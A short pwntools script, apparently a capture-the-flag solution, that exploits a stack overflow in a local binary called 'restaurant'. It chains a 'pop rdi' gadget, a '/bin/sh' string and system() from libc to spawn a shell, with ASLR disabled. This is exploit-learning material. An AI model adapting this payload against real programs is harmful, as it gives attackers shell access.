#!/usr/bin/python3

"""
Make sure to disable ASLR
I've used libc-2.31.so to find gadget
This exploit works locally (ret2libc)
Tested this on Kali Linux
The following addresses mentioned here will differ in different OS
This exploit might not work in different Kali Linux even but I've put this inorder to prove the POC in local system
"""

from pwn import *

base_addr = 0x00007ffff7dee000 # base address

payload = b"A" * 32 # offset till rbp
payload += b"BBBBBBBB" # overwriting rbp
payload += p64(base_addr + 0x0000000000026796) # pop rdi; ret
payload += p64(base_addr + 0x18a156) # /bin/sh
payload += p64(0x7ffff7e36e50) # system

p = process('./restaurant')

p.recvuntil("What would you like?")
p.sendline('1')
p.recvuntil("You can add these ingredients to your dish:")
p.sendline(payload)
p.interactive()
